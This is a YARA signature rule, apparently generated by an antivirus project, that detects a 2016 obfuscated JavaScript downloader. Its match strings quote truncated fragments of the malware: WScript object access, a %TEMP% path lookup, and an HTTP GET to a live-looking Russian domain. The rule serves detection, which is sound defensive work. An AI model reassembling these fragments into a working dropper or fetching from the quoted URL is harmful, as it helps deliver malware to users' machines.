rule sig_20160428_4e57dd02471f05576467a6110108e556 {
  meta:
    description = "datamaliciousorder - file 20160428_4e57dd02471f05576467a6110108e556.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "afaf9ad8a8e8799c9230e0f101168cc01f31d7736d6350a6c3f2fb0286fb4b6f"

  strings:
    $s1  = "function AljPtkHflRpdXsmRspJhh(LlsXspDhtDsrYcxNatYus){FhsUpjXvuOypSnlZxyJxq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function AljPtkHflRpdXsmRspJhh(LlsXspDhtDsrYcxNatYus){FhsUpjXvuOypSnlZxyJxq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "return HyfPtzYxjKaoSzvWmgLdh - MriUzlVpcCbxIimTrdTrp;};" fullword ascii
    $s4  = "function WhcOhyRkuXfoUlfJgsXne(HyfPtzYxjKaoSzvWmgLdh, MriUzlVpcCbxIimTrdTrp){PpuYteGumUyyMgxHbaSvg = PpuYteGumUyyMgxHbaSvg * 1; " ascii
    $s5  = "var FhsUpjXvuOypSnlZxyJxq = function SisOzwAlyMckHkgGtpHew() {return NilLpmJusKxtPuiAiiUck[ZhsEkoXquJtnZgdTtaFye](\"WScript\"+\"" ascii
    $s6  = "QnvUvcVvfVurNygUvpKqb[BffPmlDmeZwcXlnOidIhq](\"G\" + \"ET\", \"http://banketcentr.ru/v8usja\", false);" fullword ascii
    $s7  = "var FhsUpjXvuOypSnlZxyJxq = function SisOzwAlyMckHkgGtpHew() {return NilLpmJusKxtPuiAiiUck[ZhsEkoXquJtnZgdTtaFye](\"WScript\"+\"" ascii
    $s8  = "var NilLpmJusKxtPuiAiiUck = this[\"WScript\"];" fullword ascii
    $s9  = "function MvjMlvTjsQxxOutEgvPkz() {return FhsUpjXvuOypSnlZxyJxq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function MvjMlvTjsQxxOutEgvPkz() {return FhsUpjXvuOypSnlZxyJxq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function WhcOhyRkuXfoUlfJgsXne(HyfPtzYxjKaoSzvWmgLdh, MriUzlVpcCbxIimTrdTrp){PpuYteGumUyyMgxHbaSvg = PpuYteGumUyyMgxHbaSvg * 1; " ascii
    $s12 = "function EmsPgpDinAhhQaeTuaWrp(){return BgcCecFiaTdnMilGmmOfi + \"\";};" fullword ascii
    $s13 = "if (QnvUvcVvfVurNygUvpKqb[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function HjyPkkIjsPvkQczKgiNwr() {return ((WvfMzpKwkSuzYzqKebOuw == true) && (WvfMzpKwkSuzYzqKebOuw == KnvVbtAcoUdtWkpUimFpo)) ?" ascii
    $s15 = "function HjyPkkIjsPvkQczKgiNwr() {return ((WvfMzpKwkSuzYzqKebOuw == true) && (WvfMzpKwkSuzYzqKebOuw == KnvVbtAcoUdtWkpUimFpo)) ?" ascii
    $s16 = "DhmWasUsnXfqYwhTwoIuj = true;" fullword ascii
    $s17 = "var BbfOcjAtvUwrUwzLkqKcc = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "function ZmlGerYtbMnaBgpCehRvr(VhiYaiZqzTnuUfyAcfSub) {var DvvIaiBphAjoGseVuyHfy = (1, 2, 3, 4, 5, VhiYaiZqzTnuUfyAcfSub); retur" ascii
    $s19 = "function LidAyrMocXscEjbZtbEnd()" fullword ascii
    $s20 = "}while (MxxIvqLghUqmRjxYukCvb);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}